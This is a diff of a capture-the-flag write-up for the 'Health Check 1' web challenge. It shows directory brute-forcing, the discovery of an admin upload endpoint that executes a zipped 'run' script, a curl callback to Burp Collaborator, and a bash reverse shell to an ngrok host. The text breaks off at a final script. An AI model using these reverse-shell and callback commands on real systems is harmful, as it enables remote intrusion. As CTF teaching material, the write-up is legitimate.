@@ -27,39 +27,47 @@ Some information about healthcheck1 and healthcheck2, these are 2 seperate chall
 
 
 ## Health Check 1
+A first look into web challenge we got a message `{"message":"Hello World"}` who looks like `json` format. Doing more enumeration i didnt find something worth so i try bruteforce some directories. <br>
 ![index](https://user-images.githubusercontent.com/45040001/188512190-3470dbe0-f726-4f73-92a1-11b802ffe06f.png)
 
+While directory bruteforcing running the `/docs` directory appear with different `content length` <br>
 ![docs_dir](https://user-images.githubusercontent.com/45040001/188512230-691bfdc5-8811-4e0b-a180-b15a56e97f28.png)
 
+When visit the `/docs` directory we found 3 interestings HTTP routes and they are: `POST /new`,`GET /{dir_name}` and the last one `GET /` <br>
 ![docs](https://user-images.githubusercontent.com/45040001/188512252-23eea18f-11a7-4008-b7b0-b85ed03742c8.png)
 <br>
-"<b>This endpoint is only for admin. do NOT share this link with players</b>!
 
-Upload the health check script to create a new problem. The uploaded file should be a zip file. The zip file should NOT have a top-level folder, you must place an executable (or a script) named run. You may put other fiels as you want. Below is an example output of zipinfo myzip.zip of a valid myzip.zip"
+Lets enumerate these routes... Lets take the first one and open it we will find out a description which says:
+<b>"This endpoint is only for admin. do NOT share this link with players!
+
+Upload the health check script to create a new problem. The uploaded file should be a zip file. The zip file should NOT have a top-level folder, you must place an executable (or a script) named run. You may put other fiels as you want. Below is an example output of zipinfo myzip.zip of a valid myzip.zip"</b>
 <br>
 ![admin_only](https://user-images.githubusercontent.com/45040001/188512336-edf35a77-5b7d-4bc4-bdd8-956d5aa938f3.png)
 
+When i read `you must place an executable (or a script)` instantly i thing a bash script so i tried.<br>
 ![upload exploit](https://user-images.githubusercontent.com/45040001/188512694-815aa9fe-edc5-4eb4-a3d1-fd1103a1ef8a.png)
 
-
+I create a zip file with a random name(`tet.zip`) and i put my `run` executable inside with the curl command sending a `GET` requst to my burpcollaborator.(bellow run executable source code) <br>
 ```bash
 #!/bin/bash
 
 curl http://burpcollaborator.net/
 ```
-
+After a few seconds i get the request from curl command and i knew it i can get a reverse shell just putting the reverse shell into run executable but... <br>
 ![curl](https://user-images.githubusercontent.com/45040001/188512936-18f8d21c-d5a4-4cdd-87f0-6dcdd562b042.png)
 
-
+but when i tried i had a problem.. The problem it was the URL scheme must be "http","https" so i create 2 other files.(source code below)<br>
 ![cors](https://user-images.githubusercontent.com/45040001/188512958-8afb1bfb-cba4-43b7-ba6a-3535130004f2.png)
 
+<br>
+
+The first file was the `shell.sh` where i upload it into a web server so i can reach it from the other file called `run` executable.
 ```bash
 #!/bin/bash
 # shell.sh
 
 bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12771 0>&1
 ```
-
 
 ```bash
 #!/bin/bash
